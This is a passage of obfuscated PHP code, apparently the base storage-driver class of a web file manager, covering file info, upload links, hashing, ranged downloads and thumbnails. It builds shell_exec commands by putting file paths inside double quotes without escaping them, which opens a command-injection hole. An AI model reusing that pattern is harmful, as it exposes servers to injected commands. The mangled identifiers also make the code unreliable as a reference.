$this->delFolder($cŸ¦½Ê¬ƒ); } public function rename($eƒî²Ô¥Ã¸, $fÄ£ÚÑä°®) { } public function exist($bÄè»Ø) { } public function findByHash($Dä §š‰ó = '', $F…æĞöÉó = '') { return !1; } public function isFile($eá£¥¿¿) { } public function isFolder($C¹§‚ñÓÂœ) { } public function size($eŸµÆÓàéƒ) { } public function info($dâ›ñÖŠ¸) { } public function infoSimple($f¾Ãğ½¶ ±) { return $this->info($f¾Ãğ½¶ ±); } public function infoAuth($D—á‚ğ¡é¾) { return $this->info($D—á‚ğ¡é¾); } public function infoFull($E¿«Ê”¥¡Â) { return $this->info($E¿«Ê”¥¡Â); } public function infoWithChildren($b¬™£‘Òİ) { $aÀ±´½µÇé =& $_SERVER[Ä¿Ş°¨]; $dà’ÉÌˆ¡ = $this->info($b¬™£‘Òİ); if ($dà’ÉÌˆ¡ && $dà’ÉÌˆ¡[$aÀ±´½µÇé[29]] == $aÀ±´½µÇé[76]) { $b‚Ï§¦Ö£» = array($aÀ±´½µÇé[77] => 0, $aÀ±´½µÇé[78] => 0, $aÀ±´½µÇé[79] => 0); $this->infoChildren($b¬™£‘Òİ, $b‚Ï§¦Ö£»); $dà’ÉÌˆ¡[$aÀ±´½µÇé[77]] = $b‚Ï§¦Ö£»[$aÀ±´½µÇé[77]]; $dà’ÉÌˆ¡[$aÀ±´½µÇé[80]] = array($aÀ±´½µÇé[81] => $b‚Ï§¦Ö£»[$aÀ±´½µÇé[78]], $aÀ±´½µÇé[82] => $b‚Ï§¦Ö£»[$aÀ±´½µÇé[79]]); } return $dà’ÉÌˆ¡; } public function listPath($B¬¯²á°”÷, $BöÚ¤”¨ä = false) { } public function has($Dµ„Ï ²Í, $A‹¬ªö¢–š = false, $e‚ªóô™Ç™ = false) { } public function canRead($dù·¹ò¹ê) { } public function canWrite($EÔ¬®Ïàª¯) { } public function getContent($E†¡‚óãÀµ) { } public function setContent($eÎŞÍëÎÔŸ, $f‘ªÜ”„Ÿ© = '') { } protected function infoChildren($DËö©¾İ‘, &$a«ÆÈÀ›¨) { $câÊàŒß¾¶ =& $_SERVER[Ä¿Ş°¨]; check_abort(); $B‚«ˆœª… = $this->listPath($DËö©¾İ‘, !0); $B‚«ˆœª… = array_merge($B‚«ˆœª…[$câÊàŒß¾¶[74]], $B‚«ˆœª…[$câÊàŒß¾¶[73]]); foreach ($B‚«ˆœª… as $aˆÓéåé¡‹) { if ($aˆÓéåé¡‹[$câÊàŒß¾¶[29]] == $câÊàŒß¾¶[76]) { $a«ÆÈÀ›¨[$câÊàŒß¾¶[79]]++; $bÜİ‹ø…¼ø = $this->getPathInner($aˆÓéåé¡‹[$câÊàŒß¾¶[75]]); $this->infoChildren($bÜİ‹ø…¼ø, $a«ÆÈÀ›¨); } else { $a«ÆÈÀ›¨[$câÊàŒß¾¶[78]]++; $a«ÆÈÀ›¨[$câÊàŒß¾¶[77]] += $aˆÓéåé¡‹[$câÊàŒß¾¶[77]]; } } } public function fileSubstr($Bœ¥¢¼Ç¢†, $d¬ñ¨¸ìè, $B¢£Œ»Ó²ğ) { } public function listAll($D¾‹ŒŒ²¸) { } public function upload($DÀ¸‚¢Éë„, $D–¢Å‡¡¿, $cšë±¦éÖ = false, $cÛíœŒÇéÚ = REPEAT_REPLACE) { } public function uploadFileByID($E‰¡”Ê·”Ñ, $A•×æçôĞ, $AÓ²³¼ÄÇ) { } public function uploadFileByPath($c•±é’¦¬Ó, $d³»ô¤˜Â³, $fµˆ•¯Œí± = array()) { } public function isUploadServer() { $A¢×à¦·§Á =& $_SERVER[Ä¿Ş°¨]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $A¢×à¦·§Á[83]) { return !0; } return $GLOBALS[$A¢×à¦·§Á[6]][$A¢×à¦·§Á[84]][$A¢×à¦·§Á[85]]; } public function isFileOutServer() { $F—“§«‚åê =& $_SERVER[Ä¿Ş°¨]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $F—“§«‚åê[83]) { return !0; } return $GLOBALS[$F—“§«‚åê[6]][$F—“§«‚åê[84]][$F—“§«‚åê[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($aÉßïà¾Ùã) { $e‘ó´Œø­³ =& $_SERVER[Ä¿Ş°¨]; if (!$this->isCdnHost()) { return $aÉßïà¾Ùã; } return str_replace(trim(get_url_root($aÉßïà¾Ùã), $e‘ó´Œø­³[8]), trim($this->cdnHost, $e‘ó´Œø­³[8]), $aÉßïà¾Ùã); } public function uploadLink($bë¦…ŒîĞ¸, $Cî·ÏçÍ¨” = 0) { goto FÏ ÙÙ¿óˆ; cßâ²Ÿ³µï: $c‡‘¸Ç¥ = $Cî·ÏçÍ¨” <= $b® Ç–ÁÙ› ? $DÕñ©§½ò[87] : $DÕñ©§½ò[88]; $F×¢Ì†õ±  = (!$Cî·ÏçÍ¨” ? 1 : ceil($Cî·ÏçÍ¨” / pow(1024, 3))) * 3600 * 4; $Eñö¶é¼„ = $this->{$c‡‘¸Ç¥}($bë¦…ŒîĞ¸, $F×¢Ì†õ± ); goto Fî‡Ìˆƒš; Fî‡Ìˆƒš: if ($Eñö¶é¼„) { $Eñö¶é¼„[$DÕñ©§½ò[89]] = $bë¦…ŒîĞ¸; $Eñö¶é¼„[$DÕñ©§½ò[90]] = $a•¼ÉËò‰Ÿ; } return $Eñö¶é¼„; goto EĞ¿’İ£‰; FÏ ÙÙ¿óˆ: $DÕñ©§½ò =& $_SERVER[Ä¿Ş°¨]; if ($this->isUploadServer()) { return; } $a•¼ÉËò‰Ÿ = $this->getType(); goto eâñÖ¨„“; eâñÖ¨„“: if (!in_array($a•¼ÉËò‰Ÿ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $b® Ç–ÁÙ› = 1024 * 1024 * 10; goto cßâ²Ÿ³µï; EĞ¿’İ£‰: } public function uploadFormData($EÎÁĞ¸™, $Bà…ôÕÃ¿ = 3600) { } public function multiUploadFormData($añ÷îğ·Ó‘, $B«Şùö÷‘› = 3600) { } public function download($aŒ¿ô‰½Ëï, $EÅ³Æ¯ÔùÖ) { } public function ext($FÅåÒ“˜Ó‹) { $bªªğâç£ =& $_SERVER[Ä¿Ş°¨]; if (strpos($FÅåÒ“˜Ó‹, $bªªğâç£[8]) === -1) { $dÌ÷±†¶öÕ = $FÅåÒ“˜Ó‹; } else { $dÌ÷±†¶öÕ = $this->pathThis($FÅåÒ“˜Ó‹); } $dàÂš­Ïß = $bªªğâç£[33]; if (strstr($dÌ÷±†¶öÕ, $bªªğâç£[91])) { $dàÂš­Ïß = substr($dÌ÷±†¶öÕ, strrpos($dÌ÷±†¶öÕ, $bªªğâç£[91]) + 1); $dàÂš­Ïß = strtolower($dàÂš­Ïß); } if (strlen($dàÂš­Ïß) > 3 && preg_match($bªªğâç£[92], $dàÂš­Ïß, $Eˆ—àÖÕŠ)) { $dàÂš­Ïß = $bªªğâç£[33]; } return $dàÂš­Ïß; } public function pathThis($eöƒ“˜Á) { $EõÎ’ì„‘ =& $_SERVER[Ä¿Ş°¨]; $eöƒ“˜Á = str_replace($EõÎ’ì„‘[93], $EõÎ’ì„‘[8], rtrim($eöƒ“˜Á, $EõÎ’ì„‘[8])); $b„íÜÅƒÅï = strrpos($eöƒ“˜Á, $EõÎ’ì„‘[8]); if ($b„íÜÅƒÅï === !1) { return $eöƒ“˜Á; } return substr($eöƒ“˜Á, $b„íÜÅƒÅï + 1); } public function pathFather($b‡•ˆ´‹ô™) { $D¦˜ÊØöœæ =& $_SERVER[Ä¿Ş°¨]; $b‡•ˆ´‹ô™ = str_replace($D¦˜ÊØöœæ[93], $D¦˜ÊØöœæ[8], rtrim($b‡•ˆ´‹ô™, $D¦˜ÊØöœæ[8])); $B­ÏÁøø¢³ = strrpos($b‡•ˆ´‹ô™, $D¦˜ÊØöœæ[8]); if ($B­ÏÁøø¢³ === !1) { return $D¦˜ÊØöœæ[33]; } return substr($b‡•ˆ´‹ô™, 0, $B­ÏÁøø¢³ + 1); } public function hashSimple($F½òƒ›¦Œ) { goto Aô†Ñ†æšñ; d¾¦¦×…ô†: $B¸Ï§ŠŞéÚ = 200; $d»‹¿ğœÛ = 50; if ($fà£ä‚‡– <= $B¸Ï§ŠŞéÚ * $d»‹¿ğœÛ) { return $this->hashMd5($F½òƒ›¦Œ) . $fà£ä‚‡–; } goto a‰ÉÈ¹˜–‹; C—îÉĞ: $a‹èŠù„Û¨ .= $this->fileSubstr($F½òƒ›¦Œ, $fà£ä‚‡– - $B¸Ï§ŠŞéÚ, $B¸Ï§ŠŞéÚ); return md5($a‹èŠù„Û¨) . $fà£ä‚‡–; goto C„”¹…ó‰; a‰ÉÈ¹˜–‹: $E²“Å˜íó = intval($fà£ä‚‡– / $d»‹¿ğœÛ); $a‹èŠù„Û¨ = $e™§®¸»†÷[33]; for ($A…´ÒÆÊÓĞ = 0; $A…´ÒÆÊÓĞ < $d»‹¿ğœÛ; $A…´ÒÆÊÓĞ++) { $a‹èŠù„Û¨ .= $this->fileSubstr($F½òƒ›¦Œ, $E²“Å˜íó * $A…´ÒÆÊÓĞ, $B¸Ï§ŠŞéÚ); } goto C—îÉĞ; Aô†Ñ†æšñ: $e™§®¸»†÷ =& $_SERVER[Ä¿Ş°¨]; if (!$F½òƒ›¦Œ) { return md5($e™§®¸»†÷[33]); } $fà£ä‚‡– = $this->size($F½òƒ›¦Œ); goto d¾¦¦×…ô†; C„”¹…ó‰: } public static $md5Cache = array(); public function hashMd5($aµ‚á…’‡‰) { $aµ‚á…’‡‰ = $this->iconvSystem($aµ‚á…’‡‰); if (isset(self::$md5Cache[$aµ‚á…’‡‰])) { return self::$md5Cache[$aµ‚á…’‡‰]; } self::$md5Cache[$aµ‚á…’‡‰] = $this->hashMd5Shell($aµ‚á…’‡‰); if (!self::$md5Cache[$aµ‚á…’‡‰]) { self::$md5Cache[$aµ‚á…’‡‰] = @md5_file($aµ‚á…’‡‰); } return self::$md5Cache[$aµ‚á…’‡‰]; } private function hashMd5Shell($DøÅ»±÷¶¤) { goto Cá°Îäèù; cÇŠ ¤éÃ: $b§×Î¶¦à = shell_exec($Eªí­¹…©é . "\x20\x22{$DøÅ»±÷¶¤}\x22"); return substr($b§×Î¶¦à, 0, 32); goto CÄ‹¯ô…§; Cá°Îäèù: $DÃ«§ç˜ÔÛ =& $_SERVER[Ä¿Ş°¨]; if (!function_exists($DÃ«§ç˜ÔÛ[94])) { return !1; } $b§ÄƒÌ” = array($DÃ«§ç˜ÔÛ[95], $DÃ«§ç˜ÔÛ[96]); goto b°Ô±Ã®Ñ; b°Ô±Ã®Ñ: $Eªí­¹…©é = Cache::get($DÃ«§ç˜ÔÛ[97]); if (!$Eªí­¹…©é) { $bÈ™ùÄ­™“ = BASIC_PATH . $DÃ«§ç˜ÔÛ[98]; $d„Ê¨²½†ğ = md5_file($bÈ™ùÄ­™“); $Eªí­¹…©é = $DÃ«§ç˜ÔÛ[99]; foreach ($b§ÄƒÌ” as $A¾ì‰ …Ë) { $b§×Î¶¦à = shell_exec($A¾ì‰ …Ë . "\40\42{$bÈ™ùÄ­™“}\x22"); if ($b§×Î¶¦à && substr(trim($b§×Î¶¦à), 0, 32) == $d„Ê¨²½†ğ) { $Eªí­¹…©é = $A¾ì‰ …Ë; break; } } Cache::set($DÃ«§ç˜ÔÛ[97], $Eªí­¹…©é, 3600); } if ($Eªí­¹…©é == $DÃ«§ç˜ÔÛ[99]) { return !1; } goto cÇŠ ¤éÃ; CÄ‹¯ô…§: } public function link($BÍ†å¦ªé) { return $BÍ†å¦ªé; } public function fileOut($eÍò„ó„³, $Bé‰ôË½¤ = false, $a†µ õÏöç = false, $DÏìà£ôÂœ = '') { goto eÀøÔœÅÁ©; eÀøÔœÅÁ©: $FØÁŠ‰è­ =& $_SERVER[Ä¿Ş°¨]; $this->cacheMethod(null, null); if (!$eÍò„ó„³ || !$this->exist($eÍò„ó„³)) { show_json(LNG($FØÁŠ‰è­[100]), !1, $a†µ õÏöç); } goto EÉ¿´›«ò¯; eëšôé‘À©: header($FØÁŠ‰è­[149] . ($b¼³ó¥²ƒÖ - $eçòìó® + 1)); if ($_SERVER[$FØÁŠ‰è­[150]] == $FØÁŠ‰è­[151]) { return; } $b•ªô¤‘Ö• = 1024 * 100; goto f®äöæ¼Š; b´áÜÈî: header($FØÁŠ‰è­[120]); header($FØÁŠ‰è­[121] . $Eèƒï‰¾¬Ê); header($FØÁŠ‰è­[122] . gmdate($FØÁŠ‰è­[105], time() + 3600 * 24 * 30) . $FØÁŠ‰è­[123]); goto BÛäíÀÜ…İ; BÛäíÀÜ…İ: header($FØÁŠ‰è­[124]); header($FØÁŠ‰è­[125]); header($FØÁŠ‰è­[126]); goto AÔä«íªÇ–; AÛÕ‚Õ¿¿: $A¦ÃãÛ±ó = rawurlencode($CŒæÉªŠ•); $A¦ÃãÛ±ó = $FØÁŠ‰è­[112] . $A¦ÃãÛ±ó . $FØÁŠ‰è­[116] . $A¦ÃãÛ±ó; if ($Bé‰ôË½¤) { header($FØÁŠ‰è­[117]); header($FØÁŠ‰è­[118] . $A¦ÃãÛ±ó); } else { header($FØÁŠ‰è­[119] . $A¦ÃãÛ±ó); } goto b´áÜÈî; f®äöæ¼Š: $A‚©Å‹“‡î = 0; if ($b¶£ƒĞÀŠ) { $A‚©Å‹“‡î = intval(1000 * 1000 * ($b•ªô¤‘Ö• / $b¶£ƒĞÀŠ)); } while ($eçòìó® <= $b¼³ó¥²ƒÖ) { $F˜Àï•¨Š« = timeFloat(); check_abort(); $eöÖŸ¢†Î½ = $b¼³ó¥²ƒÖ - $eçòìó® + 1; if ($eöÖŸ¢†Î½ <= $b•ªô¤‘Ö•) { $b•ªô¤‘Ö• = $eöÖŸ¢†Î½; } echo $this->fileSubstr($eÍò„ó„³, $eçòìó®, $b•ªô¤‘Ö•); $eçòìó® += $b•ªô¤‘Ö•; if ($b•ªô¤‘Ö• == $eöÖŸ¢†Î½) { $eçòìó® = $b¼³ó¥²ƒÖ + 1; } if ($A‚©Å‹“‡î) { $fÁ®ìèêÍ” = intval(1000 * 1000 * (timeFloat() - $F˜Àï•¨Š«)); $Fš¥……¬Ïâ = $A‚©Å‹“‡î - $fÁ®ìèêÍ”; if ($Fš¥……¬Ïâ > 5) { usleep($Fš¥……¬Ïâ); } } } goto D®·ìŒ‰±; EÉ¿´›«ò¯: $d˜Ùõ÷ˆÁ¾ = $this->getType() == $FØÁŠ‰è­[101]; $B¶Ä£†Š‹¡ = $GLOBALS[$FØÁŠ‰è­[6]][$FØÁŠ‰è­[84]][$FØÁŠ‰è­[102]][$FØÁŠ‰è­[103]]; $b¶£ƒĞÀŠ = (double) $GLOBALS[$FØÁŠ‰è­[6]][$FØÁŠ‰è­[84]][$FØÁŠ‰è­[102]][$FØÁŠ‰è­[104]] * 1024 * 1024; goto dğõ¾¯‘ŸË; cÙ÷×ˆ“ Œ: $eçòìó® = 0; $b¼³ó¥²ƒÖ = $fç˜©ëêğ« - 1; $Bõ¬ÄïÍ´Ÿ = $this->ext($CŒæÉªŠ•); goto A¬ºÑÈ¢š; A¬ºÑÈ¢š: if (in_array($Bõ¬ÄïÍ´Ÿ, array($FØÁŠ‰è­[107], $FØÁŠ‰è­[108], $FØÁŠ‰è­[109], $FØÁŠ‰è­[110]))) { $Bõ¬ÄïÍ´Ÿ = $FØÁŠ‰è­[111]; } if (!$DÏìà£ôÂœ) { $DÏìà£ôÂœ = md5($A¡‹š¨æÈæ . $this->hashSimple($eÍò„ó„³)); } $DÏìà£ôÂœ = $FØÁŠ‰è­[112] . $DÏìà£ôÂœ . $FØÁŠ‰è­[112]; goto A†–˜Âš´Â; F“àáèù³è: $fç˜©ëêğ« = $cÛíÕÑŒ’[$FØÁŠ‰è­[77]]; $A¡‹š¨æÈæ = gmdate($FØÁŠ‰è­[105], $cÛíÕÑŒ’[$FØÁŠ‰è­[106]]); $CŒæÉªŠ• = $a†µ õÏöç ? $a†µ õÏöç : $this->iconvApp($cÛíÕÑŒ’[$FØÁŠ‰è­[28]]); goto cÙ÷×ˆ“ Œ; DÎ„‡˜¤å: header($FØÁŠ‰è­[131] . $A¡‹š¨æÈæ . $FØÁŠ‰è­[123]); header($FØÁŠ‰è­[132] . $CŒæÉªŠ•); header($FØÁŠ‰è­[133]); goto bÖĞİÍá–¸; AÔä«íªÇ–: if (isset($_SERVER[$FØÁŠ‰è­[127]]) && strtotime($_SERVER[$FØÁŠ‰è­[127]]) == $cÛíÕÑŒ’[$FØÁŠ‰è­[106]]) { header($FØÁŠ‰è­[128], !0, 304); die; } if (isset($_SERVER[$FØÁŠ‰è­[129]]) && $_SERVER[$FØÁŠ‰è­[129]] == $DÏìà£ôÂœ) { header($FØÁŠ‰è­[130] . $DÏìà£ôÂœ, !0, 304); die; } header($FØÁŠ‰è­[130] . $DÏìà£ôÂœ); goto DÎ„‡˜¤å; bÖĞİÍá–¸: header($FØÁŠ‰è­[134] . $fç˜©ëêğ«); header($FØÁŠ‰è­[135]); if (!$Bé‰ôË½¤ && $Bõ¬ÄïÍ´Ÿ == $FØÁŠ‰è­[136]) { if ($fç˜©ëêğ« > 1024 * 1024 * 5) { die; } $b®†×ğà·‰ = $this->getContent($eÍò„ó„³); $b®†×ğà·‰ = Html::clearSVG($b®†×ğà·‰); echo $b®†×ğà·‰; die; } goto B¿Ÿ¿ˆëß¢; dğõ¾¯‘ŸË: @ob_end_clean(); set_timeout(); $cÛíÕÑŒ’ = $this->infoFull($eÍò„ó„³); goto F“àáèù³è; B¿Ÿ¿ˆëß¢: $e˜ã„¯ª‘é = strtolower($_SERVER[$FØÁŠ‰è­[137]]); if ($d˜Ùõ÷ˆÁ¾ && $e˜ã„¯ª‘é && $B¶Ä£†Š‹¡) { if (strstr($e˜ã„¯ª‘é, $FØÁŠ‰è­[138])) { header($FØÁŠ‰è­[139] . $eÍò„ó„³); } else { if (strstr($e˜ã„¯ª‘é, $FØÁŠ‰è­[140])) { header($FØÁŠ‰è­[141] . $eÍò„ó„³); } else { if (strstr($e˜ã„¯ª‘é, $FØÁŠ‰è­[142])) { header($FØÁŠ‰è­[143] . $eÍò„ó„³); } } } if ($b¶£ƒĞÀŠ) { header($FØÁŠ‰è­[144] . $b¶£ƒĞÀŠ); } return; } if (isset($_SERVER[$FØÁŠ‰è­[145]])) { if (preg_match($FØÁŠ‰è­[146], $_SERVER[$FØÁŠ‰è­[145]], $EøÂê–Š¢)) { $eçòìó® = intval($EøÂê–Š¢[1]); if (!empty($EøÂê–Š¢[2])) { $b¼³ó¥²ƒÖ = intval($EøÂê–Š¢[2]); } } header($FØÁŠ‰è­[147]); header("\x43\157\x6e\164\x65\156\164\55\122\x61\156\147\x65\x3a\x20\142\171\x74\x65\163\x20{$eçòìó®}\x2d{$b¼³ó¥²ƒÖ}\x2f" . $fç˜©ëêğ«); } else { header($FØÁŠ‰è­[148]); } goto eëšôé‘À©; A†–˜Âš´Â: $Eèƒï‰¾¬Ê = get_file_mime($Bõ¬ÄïÍ´Ÿ); if (strstr($Eèƒï‰¾¬Ê, $FØÁŠ‰è­[113])) { $Eèƒï‰¾¬Ê = $Eèƒï‰¾¬Ê . $FØÁŠ‰è­[114]; } if ($Bé‰ôË½¤ === !1 && !mime_support($Eèƒï‰¾¬Ê)) { $Bé‰ôË½¤ = !0; $Eèƒï‰¾¬Ê = $FØÁŠ‰è­[115]; } goto AÛÕ‚Õ¿¿; D®·ìŒ‰±: } public function fileOutServer($Eˆ¸¸ÕöÉŸ, $eÔØŸçÀƒ = false, $C ˜šÙ›İ = false, $d±¶®×‹¬Ó = '') { $this->fileOut($Eˆ¸¸ÕöÉŸ, $eÔØŸçÀƒ, $C ˜šÙ›İ, $d±¶®×‹¬Ó); } public function fileOutLink($cÆËºùÜô) { header($_SERVER[Ä¿Ş°¨][152] . $cÆËºùÜô); die; } public function cacheMethod($BöêŞ¢³…, $BËÇÀêõß“) { goto aò´ÙÚÁôË; aò´ÙÚÁôË: $aïº‡œèÑè =& $_SERVER[Ä¿Ş°¨]; static $bŞ³èÉÑõÅ = array(); $c¿õ´´Œ¨Ÿ = $aïº‡œèÑè[153] . $BöêŞ¢³… . $aïº‡œèÑè[154] . rtrim($BËÇÀêõß“, $aïº‡œèÑè[8]); goto AïÄ«—í„„; AïÄ«—í„„: if (is_null($BöêŞ¢³…)) { $bŞ³èÉÑõÅ = array(); return; } if (is_null($BËÇÀêõß“)) { unset($bŞ³èÉÑõÅ[$c¿õ´´Œ¨Ÿ]); return; } $fğÛ‰ÌÜ¹¾ = isset($bŞ³èÉÑõÅ[$c¿õ´´Œ¨Ÿ]) ? $bŞ³èÉÑõÅ[$c¿õ´´Œ¨Ÿ] : null; goto E÷õĞØÆä†; E÷õĞØÆä†: if (!is_null($fğÛ‰ÌÜ¹¾)) { return $fğÛ‰ÌÜ¹¾; } $fğÛ‰ÌÜ¹¾ = $this->{$BöêŞ¢³…}($BËÇÀêõß“); $bŞ³èÉÑõÅ[$c¿õ´´Œ¨Ÿ] = $fğÛ‰ÌÜ¹¾; goto CÓ·ó®¦™Õ; CÓ·ó®¦™Õ: return $fğÛ‰ÌÜ¹¾; goto FƒæŸÆââØ; FƒæŸÆââØ: } public function fileOutImage($f©äò–Öè·, $e’ÉŒƒŞ‚ö = 250) { goto b©…‰Í©áå; A›ä‘ã³…§: if (!($b‘…¬ƒ”‹ô = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $c¤…¶…Âª[161]))) { $D·š˜è¹Ë = IO::mkdir(IO_PATH_SYSTEM_TEMP . $c¤…¶…Âª[162]); } else { $D·š˜è¹Ë = KodIO::make($b‘…¬ƒ”‹ô); } if ($b‘…¬ƒ”‹ô = IO::fileNameExist($D·š˜è¹Ë, $Côšµ´á÷)) { $dÆ†º¿Şß = KodIO::make($b‘…¬ƒ”‹ô); return IO::fileOut($dÆ†º¿Şß); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto c—Û—Áâ’; E¡‚òî²å‚: if (!($DòÓ«Üê– = IO::move($dÆ†º¿Şß, $D·š˜è¹Ë))) { return IO::fileOut($dÆ†º¿Şß); } del_file($dÆ†º¿Şß); IO::fileOut($DòÓ«Üê–); goto dÎšÚ…³ôÏ; e‘ ÁÃŠ¾½: if ($c•˜¥öœğ÷[$c¤…¶…Âª[77]] <= 1024 * 50 || !function_exists($c¤…¶…Âª[155]) || $c•˜¥öœğ÷[$c¤…¶…Âª[156]] == $c¤…¶…Âª[157]) { return $this->fileOut($f©äò–Öè·); } if (isset($c•˜¥öœğ÷[$c¤…¶…Âª[158]][$c¤…¶…Âª[159]])) { $C£Ï¾°èö‹ = $c•˜¥öœğ÷[$c¤…¶…Âª[158]][$c¤…¶…Âª[159]]; } else { if (isset($c•˜¥öœğ÷[$c¤…¶…Âª[158]][$c¤…¶…Âª[160]])) { $C£Ï¾°èö‹ = $c•˜¥öœğ÷[$c¤…¶…Âª[158]][$c¤…¶…Âª[160]]; } else { $C£Ï¾°èö‹ = md5("{$c•˜¥öœğ÷[$c¤…¶…Âª[28]]}\137{$c•˜¥öœğ÷[$c¤…¶…Âª[75]]}\x5f{$c•˜¥öœğ÷[$c¤…¶…Âª[77]]}"); } } $Côšµ´á÷ = "{$C£Ï¾°èö‹}\x5f{$e’ÉŒƒŞ‚ö}\56\x70\156\147"; goto A›ä‘ã³…§; b©…‰Í©áå: $c¤…¶…Âª =& $_SERVER[Ä¿Ş°¨]; if (substr($f©äò–Öè·, 0, 4) == $c¤…¶…Âª[142]) { $this->fileOutLink($f©äò–Öè·); } $c•˜¥öœğ÷ = $this->info($f©äò–Öè·); goto e‘ ÁÃŠ¾½; c—Û—Áâ’: $dÆ†º¿Şß = DATA_THUMB . $Côšµ´á÷; if (!@file_exists($dÆ†º¿Şß)) { $F‘‰»¼™Ğñ = TEMP_FILES; if (!is_dir($F‘‰»¼™Ğñ)) { mk_dir($F‘‰»¼™Ğñ); } $a½ë’¥Ç´ = $F‘‰»¼™Ğñ . $C£Ï¾°èö‹ . $c¤…¶…Âª[91] . $c•˜¥öœğ÷[$c¤…¶…Âª[156]]; if (!@file_exists($a½ë’¥Ç´)) { $a½ë’¥Ç´ = $this->download($f©äò–Öè·, $a½ë’¥Ç´); } $CÌğíôœ±¿ = new ImageThumb($a½ë’¥Ç´, $c¤…¶…Âª[163]); $CÌğíôœ±¿->prorate($dÆ†º¿Şß, $e’ÉŒƒŞ‚ö, $e’ÉŒƒŞ‚ö * 10); } if (!file_exists($dÆ†º¿Şß) || filesize($dÆ†º¿Şß) < 100) { return @file_exists($a½ë’¥Ç´) ? IO::fileOut($a½ë’¥Ç´) : $this->fileOut($f©äò–Öè·); } goto E¡‚òî²å‚; dÎšÚ…³ôÏ: } public function fileOutImageServer($DŠÒÓ‹¥¿´, $bâŒ„ã…†Ä = 250) { $this->fileOutImage($DŠÒÓ‹¥¿´, $bâŒ„ã…†Ä); } public function fileNameAuto($aÎšÌÚÅ¿, $Fó¨Ûôóàƒ, $eùù¹í¼ˆø = REPEAT_RENAME, $E¬ÚÂ®×¡ğ = false) { goto fÓÃÚÌˆÜ; FëåÇ©³½Ø: if ($eùù¹í¼ˆø == REPEAT_SKIP) { return !1; } $bÕãÌœî—¸ = $d•¢éìğè[91] . get_path_ext($Fó¨Ûôóàƒ); $bÕãÌœî—¸ = $bÕãÌœî—¸ == $d•¢éìğè[91] || $E¬ÚÂ®×¡ğ ? $d•¢éìğè[33] : $bÕãÌœî—¸; goto a¿©¯Ë©‚–; fÓÃÚÌˆÜ: $d•¢éìğè =& $_SERVER[Ä¿Ş°¨]; $eí¨ö‡É‡ = $aÎšÌÚÅ¿ === $d•¢éìğè[33] ? $Fó¨Ûôóàƒ : rtrim($aÎšÌÚÅ¿, $d•¢éìğè[8]) . $d•¢éìğè[8] . $Fó¨Ûôóàƒ; if ($eùù¹í¼ˆø == REPEAT_REPLACE || !$this->exist($eí¨ö‡É‡) || $E¬ÚÂ®×¡ğ && $eùù¹í¼ˆø != REPEAT_RENAME_FOLDER) { return $Fó¨Ûôóàƒ; } goto FëåÇ©³½Ø; d‘Ç™¢ªç­: while ($this->exist(rtrim($aÎšÌÚÅ¿, $d•¢éìğè[8]) . $d•¢éìğè[8] . $cç›´À¹†)) { $cç›´À¹† = $Aß„½ƒ ƒ . "\50{$cø­Á‚š“Ù}\51{$bÕãÌœî—¸}"; $cø­Á‚š“Ù++; } return $cç›´À¹†; goto E·±Š¾¡Ë©; a¿©¯Ë©‚–: $cø­Á‚š“Ù = 1; $Aß„½ƒ ƒ = substr($Fó¨Ûôóàƒ, 0, strlen($Fó¨Ûôóàƒ) - strlen($bÕãÌœî—¸)); $cç›´À¹† = $Aß„½ƒ ƒ . "\x28{$cø­Á‚š“Ù}\x29{$bÕãÌœî—¸}"; goto d‘Ç™¢ªç­; E·±Š¾¡Ë©: } public function listAllFiles($e‰ñÃ¶ÍÏ, $d•Ãéé¢‘, $A™˜‚İˆ¸ = array()) { goto a‡¯ó¢°; dÖªäŒîÕ: foreach (array_unique($F¼ä¥ñøµ¯) as $dé¡‰“Î–) { $d­…ËÃ·¹  = array($EòÆÌî›¾Ğ[75] => $this->getPathOuter($EòÆÌî›¾Ğ[8] . $e‰ñÃ¶ÍÏ . $EòÆÌî›¾Ğ[8] . $dé¡‰“Î–), $EòÆÌî›¾Ğ[76] => 1, $EòÆÌî›¾Ğ[77] => 0); if (substr($dé¡‰“Î–, -1) != $EòÆÌî›¾Ğ[8]) { $d­…ËÃ·¹ [$EòÆÌî›¾Ğ[76]] = 0; $fÎï‘°Ü—Õ = $this->getPath($e‰ñÃ¶ÍÏ . $EòÆÌî›¾Ğ[8] . $dé¡‰“Î–); $d­…ËÃ·¹ [$EòÆÌî›¾Ğ[77]] = isset($A™˜‚İˆ¸[$fÎï‘°Ü—Õ]) ? $A™˜‚İˆ¸[$fÎï‘°Ü—Õ] : $this->size($fÎï‘°Ü—Õ); } $A‡ÂßÅ[] = $d­…ËÃ·¹ ; } return $A‡ÂßÅ; goto eïÇƒæÓÄÔ; A¿öÁÀƒ¡: $e‰ñÃ¶ÍÏ = trim($e‰ñÃ¶ÍÏ, $EòÆÌî›¾Ğ[8]); foreach ($d•Ãéé¢‘ as $dé¡‰“Î–) { $c¤ÌÉõî¿Ò = ltrim(substr($dé¡‰“Î–, strlen($e‰ñÃ¶ÍÏ)), $EòÆÌî›¾Ğ[8]); $F¼ä¥ñøµ¯ = array_merge($F¼ä¥ñøµ¯, $this->slicePath($c¤ÌÉõî¿Ò)); } $A‡ÂßÅ = array(); goto dÖªäŒîÕ; a‡¯ó¢°: $EòÆÌî›¾Ğ =& $_SERVER[Ä¿Ş°¨]; if (empty($d•Ãéé¢‘)) { return array(); } $F¼ä¥ñøµ¯ = array(); goto A¿öÁÀƒ¡; eïÇƒæÓÄÔ: } public function slicePath($EÓÃåØáå) { $FõƒÕ‘©ïñ =& $_SERVER[Ä¿Ş°¨]; $fì³ßç‘¾› = explode($FõƒÕ‘©ïñ[8], trim($EÓÃåØáå, $FõƒÕ‘©ïñ[8])); $b¹ô½Î·Á± = 0; do { ++$b¹ô½Î·Á±; $AäÕÏÛŞµ¥[] = implode($FõƒÕ‘©ïñ[8], array_slice($fì³ßç‘¾›, 0, $b¹ô½Î·Á±)) . $FõƒÕ‘©ïñ[8]; } while ($b¹ô½Î·Á± < count($fì³ßç‘¾›)); $AäÕÏÛŞµ¥[count($fì³ßç‘¾›) - 1] = $EÓÃåØáå; return $AäÕÏÛŞµ¥; } public function getHost() { $EÚŞåÀ°ÜÛ =& $_SERVER[Ä¿Ş°¨]; $A—³íÒªæ = 